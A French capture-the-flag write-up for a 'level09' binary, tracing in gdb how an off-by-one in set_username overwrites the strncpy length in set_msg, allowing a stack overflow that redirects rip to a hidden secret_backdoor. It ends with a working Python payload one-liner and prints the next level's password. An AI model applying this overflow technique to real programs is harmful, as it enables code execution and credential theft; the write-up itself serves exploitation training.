# Level 9

En décompilant l'exécutable, on remarque que le programme attend en entrée standard un `username` et un `message`.
```c
set_username((char *)&var_c0h);
set_msg((char *)&var_c0h);
puts(0xbc0);
```
On remarque également une fonction non appelée `secret_backdoor` qui fait appel à la fonction `system`.

En imprimant la `stack` après les appels aux fonctions `set_username` et `set_msg`, on peut remarquer que les entrées `username` et `message` sont copiées dans la `stack`.
```
> gdb level09
[...]
> (gdb) b main
Breakpoint 1 at 0xaac
> (gdb) r
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
> (gdb) disas handle_msg
[...]
   0x000055555555490d <+77>:	mov    %rax,%rdi
   0x0000555555554910 <+80>:	callq  0x5555555549cd <set_username>
   0x0000555555554915 <+85>:	lea    -0xc0(%rbp),%rax
   0x000055555555491c <+92>:	mov    %rax,%rdi
   0x000055555555491f <+95>:	callq  0x555555554932 <set_msg>
   0x0000555555554924 <+100>:	lea    0x295(%rip),%rdi        # 0x555555554bc0
   0x000055555555492b <+107>:	callq  0x555555554730 <puts@plt>
   0x0000555555554930 <+112>:	leaveq 
   0x0000555555554931 <+113>:	retq   
End of assembler dump.
> (gdb) b *0x000055555555492b
Breakpoint 2 at 0x55555555492b
```
On lance le programme en saisissant des entrées reconnaissables.
```
(gdb) c
Continuing.
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAA
>: Welcome, AAAA
>: Msg @Unix-Dude
>>: BBBB

Breakpoint 2, 0x000055555555492b in handle_msg ()
```
On affiche la `stack`.
```
> (gdb) x/30gx $sp
0x7fffffffe500:	0x0000000a42424242	0x0000000000000000
                                 ^
                                 message
0x7fffffffe510:	0x0000000000000000	0x0000000000000000
0x7fffffffe520:	0x0000000000000000	0x0000000000000000
0x7fffffffe530:	0x0000000000000000	0x0000000000000000
0x7fffffffe540:	0x0000000000000000	0x0000000000000000
0x7fffffffe550:	0x0000000000000000	0x0000000000000000
0x7fffffffe560:	0x0000000000000000	0x0000000000000000
0x7fffffffe570:	0x0000000000000000	0x0000000000000000
0x7fffffffe580:	0x0000000000000000	0x4141414100000000
                                             ^
                                             username
0x7fffffffe590:	0x000000000000000a	0x0000000000000000
0x7fffffffe5a0:	0x0000000000000000	0x0000000000000000
0x7fffffffe5b0:	0x0000008c00000000	0x00007fffffffe5d0
0x7fffffffe5c0:	0x00007fffffffe5d0	0x0000555555554abd
0x7fffffffe5d0:	0x0000000000000000	0x00007ffff7a3d7ed
0x7fffffffe5e0:	0x0000000000000000	0x00007fffffffe6b8
```

## Objectif

En imprimant la valeur de `rip`, on remarque qu'il semble possible d'écraser sa valeur en copiant le `username` ou le `message` et ainsi la remplacer par l'adresse de la fonction `secret_backdoor`.
```
> (gdb) x $rbp+0x08
0x7fffffffe5c8:	0x0000555555554abd
> (gdb) x/30gx $sp
0x7fffffffe500:	0x0000000a42424242	0x0000000000000000
                                 ^
                                 message
0x7fffffffe510:	0x0000000000000000	0x0000000000000000
0x7fffffffe520:	0x0000000000000000	0x0000000000000000
0x7fffffffe530:	0x0000000000000000	0x0000000000000000
0x7fffffffe540:	0x0000000000000000	0x0000000000000000
0x7fffffffe550:	0x0000000000000000	0x0000000000000000
0x7fffffffe560:	0x0000000000000000	0x0000000000000000
0x7fffffffe570:	0x0000000000000000	0x0000000000000000
0x7fffffffe580:	0x0000000000000000	0x4141414100000000
                                             ^
                                             username
0x7fffffffe590:	0x000000000000000a	0x0000000000000000
0x7fffffffe5a0:	0x0000000000000000	0x0000000000000000
0x7fffffffe5b0:	0x0000008c00000000	0x00007fffffffe5d0
0x7fffffffe5c0:	0x00007fffffffe5d0	0x0000555555554abd
                                                     ^
                                                     rip
0x7fffffffe5d0:	0x0000000000000000	0x00007ffff7a3d7ed
0x7fffffffe5e0:	0x0000000000000000	0x00007fffffffe6b8
```

## Problème

La fonction `set_username` ne semble copier que `40` caractères de l'entrée standard.
```c
while (((int32_t)var_4h < 0x29 && (*(char *)((int64_t)&s + (int64_t)(int32_t)var_4h) != '\0'))) {
    arg1[(int64_t)(int32_t)var_4h + 0x8c] = *(char *)((int64_t)&s + (int64_t)(int32_t)var_4h);
    var_4h._0_4_ = (int32_t)var_4h + 1;
}
```
On peut le vérifier en imprimant la `stack` avec une entrée contenant plus de 40 caractères.
```
> (gdb) r
[...]
> (gdb) c
Continuing.
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: BBBB

Breakpoint 2, 0x000055555555492b in handle_msg ()
> (gdb) x/30gx $sp
0x7fffffffe500:	0x0000000a42424242	0x0000000000000000
                                 ^
                                 message
0x7fffffffe510:	0x0000000000000000	0x0000000000000000
0x7fffffffe520:	0x0000000000000000	0x0000000000000000
0x7fffffffe530:	0x0000000000000000	0x0000000000000000
0x7fffffffe540:	0x0000000000000000	0x00007ffff7a945da
0x7fffffffe550:	0x0000000000000086	0x000000000000002d
0x7fffffffe560:	0x000000000000000a	0x0000555555554c10
0x7fffffffe570:	0x00007fffffffe6b0	0x00007ffff7a95d45
0x7fffffffe580:	0x00007ffff7dd4260	0x41414141f7a9608f
                                             ^
                                             username (40 octets)
0x7fffffffe590:	0x4141414141414141	0x4141414141414141
0x7fffffffe5a0:	0x4141414141414141	0x4141414141414141
0x7fffffffe5b0:	0x0000004141414141	0x00007fffffffe5d0
0x7fffffffe5c0:	0x00007fffffffe5d0	0x0000555555554abd
                                                     ^
                                                     rip
0x7fffffffe5d0:	0x0000000000000000	0x00007ffff7a3d7ed
0x7fffffffe5e0:	0x0000000000000000	0x00007fffffffe6b8
```
Il semble donc impossible d'atteindre `rip` avec l'entrée `username`.

La fonction `set_msg`, elle, utilise un `strncpy` pour copier le `message` dans la `stack`, protégeant ainsi un `overflow`.
```c
strncpy(arg1, &src, (int64_t)*(int32_t *)(arg1 + 0xb4), &src);
```
En revanche, en observant avec le code assembleur du deuxième argument de `strncpy`, on remarque qu'il est stocké dans la `stack`.
```
> (gdb) disas set_msg
[...]
   0x000055555555499d <+107>:	callq  0x555555554770 <fgets@plt>
   0x00005555555549a2 <+112>:	mov    -0x408(%rbp),%rax
   0x00005555555549a9 <+119>:	mov    0xb4(%rax),%eax
   0x00005555555549af <+125>:	movslq %eax,%rdx
   0x00005555555549b2 <+128>:	lea    -0x400(%rbp),%rcx
[...]
```
L'instruction à `+119` assigne `rax+0xb4` à `eax`. Cette instruction est intéressante car elle ressemble à l'opération effectuée dans le deuxième argument de `strncpy` dans le code décompilé. On peut `break` à cette instruction et afficher l'adresse de `rax+0xb4` pour confirmer son emplacement dans la `stack`.
```
> (gdb) b *0x00005555555549a9
Breakpoint 3 at 0x5555555549a9
> (gdb) r
[...]
> (gdb) c
Continuing.
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: BBBB

Breakpoint 3, 0x00005555555549a9 in set_msg ()
> (gdb) x $rax+0xb4
0x7fffffffe5b4:	0xffffe5d00000000a
```

Si on reprend l'affichage de notre `stack` précédent :
```
0x7fffffffe500:	0x0000000a42424242	0x0000000000000000
                                 ^
                                 message
0x7fffffffe510:	0x0000000000000000	0x0000000000000000
0x7fffffffe520:	0x0000000000000000	0x0000000000000000
0x7fffffffe530:	0x0000000000000000	0x0000000000000000
0x7fffffffe540:	0x0000000000000000	0x00007ffff7a945da
0x7fffffffe550:	0x0000000000000086	0x000000000000002d
0x7fffffffe560:	0x000000000000000a	0x0000555555554c10
0x7fffffffe570:	0x00007fffffffe6b0	0x00007ffff7a95d45
0x7fffffffe580:	0x00007ffff7dd4260	0x41414141f7a9608f
                                             ^
                                             username (40 octets)
0x7fffffffe590:	0x4141414141414141	0x4141414141414141
0x7fffffffe5a0:	0x4141414141414141	0x4141414141414141
0x7fffffffe5b0:	0x0000004141414141	0x00007fffffffe5d0
                         ^
                         rax+0xb4
0x7fffffffe5c0:	0x00007fffffffe5d0	0x0000555555554abd
                                                     ^
                                                     rip
0x7fffffffe5d0:	0x0000000000000000	0x00007ffff7a3d7ed
0x7fffffffe5e0:	0x0000000000000000	0x00007fffffffe6b8
```
On remarque que cet argument passé à la fonction `strncpy` pour connaitre le nombre d'octets à copier peut-être écrasé par le dernier octet de notre `username`. Nous allons utiliser ce dernier octet pour indiquer à la fonction `strncpy` le nombre d'octet à copier et ainsi écraser la valeur de `rip` avec le `message`.

## Exploit

Il nous faut au préalable déterminer le nombre d'octets à saisir dans le `message`.
```
taille_message = adresse_eip - adresse_buffer_message
               = (rbp + 0x08) - adresse_buffer_message
               = 0x7fffffffe5c8 - 0x7fffffffe500
               = 0xc8
               = 200 (base 10)
```
`200` caractères dans `message` nous permettrons d'atteindre `rip`. Le dernier octet de `username` peut-être `0xff` (`255` en base 10). Une copie de `255` octets sera suffisante pour atteindre `rip`.

Enfin, il nous faut trouver l'adresse de la fonction `secret_backdoor`. On utilise `gdb`.
```
> (gdb) x secret_backdoor
0x55555555488c <secret_backdoor>:	0x80c48348e5894855
```
L'adresse de la fonction `secret_backdoor` est `0x55555555488c`.

Finalement, on peut construire notre commande de cette manière :
```
> (python -c 'print "A"*40 + "\xff" + "\n" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
